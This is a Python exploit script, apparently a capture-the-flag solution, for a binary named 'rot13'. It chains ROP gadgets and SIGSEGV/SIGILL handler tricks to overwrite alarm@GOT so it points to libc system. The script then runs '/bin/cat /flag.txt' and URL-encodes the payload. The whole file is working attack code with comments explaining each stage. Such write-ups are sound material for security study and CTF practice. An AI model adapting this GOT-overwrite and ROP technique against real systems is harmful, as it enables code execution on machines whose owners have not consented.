from ptrlib import *
from time import sleep
import urllib

command = b'/bin/cat /flag.txt'
elf = ELF("../distfiles/rot13")
libc = ELF("../distfiles/libc-2.28.so")

# rop gadgets
rop_mov_edi_0b = 0x400444
rop_pop_rbp = 0x40047f
rop_pop_rdx_rbp = 0x40047e
rop_ret = 0x00400424

# crash gadgets
"""
pwndbg> x/2i 0x40000f
   0x40000f:    add    BYTE PTR [rdx],al
   0x400011:    add    BYTE PTR [rsi],bh
pwndbg> x/2i 0x400f38
   0x400f38:    add    BYTE PTR [rax],dl
   0x400f3a:    (bad)
"""
cop_add_rdx_al = 0x40000f # SIGSEGV gadget
cop_add_rax_dl = 0x400f38 # SIGILL gadget

addr_vuln = 0x400481

def set_rdi_rsi(rdi, rsi):
    payload = p64(0x400425)
    payload += p64(rop_pop_rdx_rbp)
    payload += p64(rdi)
    payload += p64(rsi)
    return payload

def set_rax(rax, addr_handler, type):
    rdi = 11 if type=='SIGSEGV' else 4
    payload = set_rdi_rsi(rdi, rax)
    payload += p64(elf.plt("signal"))
    payload += set_rdi_rsi(rdi, addr_handler)
    payload += p64(elf.plt("signal"))
    return payload

whole_payload = b''

assert libc.symbol("alarm") & 0xff == libc.symbol("system") & 0xff

# 1) *(char*)(alarm+1) += delta1
# We setup the SIGSEGV handler pointing to main
# so that it won't crash by SIGSEGV gadget.
# Here we use a gadget at 0x40000f which just
# adds al to [rdx] and causes SIGSEGV.
# (I named it SIGSEGV gadget)
src = (libc.symbol("alarm") >> 8) & 0xff
dst = (libc.symbol("system") >> 8) & 0xff
for delta in range(0x100):
    if (delta + src) & 0xff == dst: break
payload = b'\x00' * 0x40
payload += b'deadbeef'
payload += set_rdi_rsi(0, 0)
payload += p64(elf.plt("alarm")) # kill alarm
payload += set_rax(delta, addr_vuln, 'SIGSEGV')
payload += p64(rop_pop_rdx_rbp)
payload += p64(elf.got("alarm") + 1)
payload += p64(0)
payload += p64(cop_add_rdx_al)
payload += b'\x00' * (0x100 - len(payload))
whole_payload += payload

# 2) *(char*)(alarm+2) += delta2
# We setup the SIGILL handler pointing to main
# so that it won't crash by SIGILL gadget.
# Here we use a gadget at 0x400f38 which just
# adds dl to [rax] and causes SIGILL.
# (I named it SIGILL gadget)
src = (libc.symbol("alarm") >> 16) & 0xff
dst = (libc.symbol("system") >> 16) & 0xff
for delta in range(0x100):
    if (delta + src) & 0xff == dst: break
payload = b'\x00' * 0x40
payload += b'deadbeef'
payload += set_rdi_rsi(0, 0x601400)
payload += p64(rop_pop_rdx_rbp)
payload += p64(len(command) + 1)
payload += p64(0xdeadbeef)
payload += p64(elf.plt("read"))
payload += set_rax(elf.got("alarm") + 2, addr_vuln, 'SIGILL')
payload += p64(rop_pop_rdx_rbp)
payload += p64(delta)
payload += p64(0)
payload += p64(cop_add_rax_dl)
payload += b'\x00' * (0x100 - len(payload))
whole_payload += payload
whole_payload += command + b'\x00'

# 3) get the shell!
# Now alarm@got points to __libc_system
payload = b'\x00' * 0x40
payload += p64(0xdeadbeef)
payload += set_rdi_rsi(0x601400, 0)
payload += p64(rop_ret)
payload += p64(elf.plt("alarm"))
payload += b'\x00' * (0x100 - len(payload))
whole_payload += payload

# 4) pwn
# We need to send the exploit to the server.
"""
sock = Process("../distfiles/rot13")
sock.send(whole_payload)
sock.interactive()
"""
param = urllib.parse.quote(whole_payload)
print(param)
#"""
